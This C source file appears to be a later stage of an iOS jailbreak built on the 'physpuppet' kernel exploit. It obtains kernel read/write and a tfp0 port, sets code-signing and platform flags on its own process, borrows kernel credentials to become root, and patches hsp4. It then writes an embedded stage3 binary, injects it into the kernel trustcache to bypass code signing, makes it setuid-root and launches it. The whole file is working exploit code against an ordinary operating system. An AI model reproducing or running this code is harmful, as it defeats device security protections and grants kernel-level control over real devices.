#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <mach/mach.h>
#include <CoreFoundation/CoreFoundation.h>
#include <CommonCrypto/CommonDigest.h>
#include <sys/stat.h>
#include <mach-o/loader.h>
#include <mach-o/fat.h>
#include <spawn.h>
#include <inttypes.h>

#include "common.h"
#include "stage3.h"
#include "trustcache.h"
#include "hsp4.h"
#include "kutils.h"
#include "log.h"
#include "kpf.h"
#include "physpuppet/exploit.h"
#include "physpuppet/libprejailbreak.h"
#include "physpuppet/offsets.h"
#include "physpuppet/utils.h"
#include "physpuppet/tfp0.h"

extern mach_port_t tfp0;

uint64_t zone_map_ref_addr;

char stage3_path[1024];

int launch(char *binary, char *arg1, char *arg2, char *arg3, char *arg4, char *arg5, char *arg6, char**env) {
    pid_t spawned_pid;
    const char* args[] = {binary, arg1, arg2, arg3, arg4, arg5, arg6,  NULL};
    
    int rv = posix_spawn(&spawned_pid, binary, NULL, NULL, (char **)&args, env);

    if (rv) return rv;
    
    return 0;
}

int extract_stage3(void) {
  memset(stage3_path, 0, 1024);
  strcpy(stage3_path, "/var/containers/Bundle/stage3");
  unlink(stage3_path);

  FILE *f = fopen(stage3_path, "wb");

  size_t total_size = sizeof(stage3);
  fwrite(stage3, 1, total_size, f);

  fclose(f);
  LOG("Wrote stage3 (%zu bytes), stage3_path = %s", total_size, stage3_path);

  return 0;
}

int load_offsets(const char *path,
                 uint64_t *trustcache_addr,
                 uint64_t *koffset_zone_map_ref) {
    FILE *f = fopen(path, "r");
    if (!f) return -1;
    if (fscanf(f,
               "trustcache_addr=0x%llx\n"
               "koffset_zone_map_ref=0x%llx",
               trustcache_addr,
               koffset_zone_map_ref) != 2) {
        fclose(f);
        return -1;
    }
    fclose(f);
    return 0;
}

int save_offsets(const char *path,
                 uint64_t trustcache_addr,
                 uint64_t koffset_zone_map_ref) {
    FILE *f = fopen(path, "w");
    if (!f) return -1;
    fprintf(f,
            "trustcache_addr=0x%llx\n"
            "koffset_zone_map_ref=0x%llx\n",
            trustcache_addr,
            koffset_zone_map_ref);
    fclose(f);
    return 0;
}

int main() {
  LOG("loaded");

  kernel_rw_init();
  tfp0_init();
  LOG("tfp0: 0x%x", tfp0);

  set_csflags(pinfo(proc));
  set_tfplatform(pinfo(proc));

  uint64_t self_ucred = borrow_ucreds(getpid(), 1);
  setuid(0); setuid(0);

  uint64_t trustcache_addr = 0;
  zone_map_ref_addr = 0;
  const char* offsets_path = "/var/log/jbme-offsets.txt";
  // kpf
  if (load_offsets(offsets_path, &trustcache_addr, &zone_map_ref_addr) != 0 
      || trustcache_addr == 0
      || zone_map_ref_addr == 0) {
    pfinder_t pfinder;
    if(pfinder_init(&pfinder) != KERN_SUCCESS) return -1;
    trustcache_addr = pfinder_trustcache(pfinder);
    zone_map_ref_addr = pfinder_zone_map_ref(pfinder);

    save_offsets(offsets_path, trustcache_addr - kinfo(slide), zone_map_ref_addr - kinfo(slide));
  } else {
    trustcache_addr += kinfo(slide);
    zone_map_ref_addr += kinfo(slide);
  }

  patch_hsp4();

  // prepare stage3
  extract_stage3();
  int tc_ret = inject_trustcache(stage3_path, trustcache_addr);
  LOG("inject_trustcache ret = %d", tc_ret);
  chmod(stage3_path, 04755);
  chown(stage3_path, 0, 0);

  char kernel_base_str[19];
  memset(kernel_base_str, 0, 19);
  snprintf(kernel_base_str, sizeof(kernel_base_str), "0x%016" PRIx64, (0xFFFFFFF007004000 + kinfo(slide)));

  char kern_proc_str[19];
  memset(kern_proc_str, 0, 19);
  snprintf(kern_proc_str, sizeof(kern_proc_str), "0x%016" PRIx64, kinfo(proc));

  char trustcache_str[19];
  memset(trustcache_str, 0, 19);
  snprintf(trustcache_str, sizeof(trustcache_str), "0x%016" PRIx64, trustcache_addr);

  launch(stage3_path, kernel_base_str, kern_proc_str, trustcache_str, NULL, NULL, NULL, NULL);

  unborrow_ucreds(getpid(), self_ucred);

  kernel_rw_deinit();

  LOG("done")

  while(1) {};

  return 0;
}

uint64_t entry[] = { MAGIC, (uint64_t)&main };
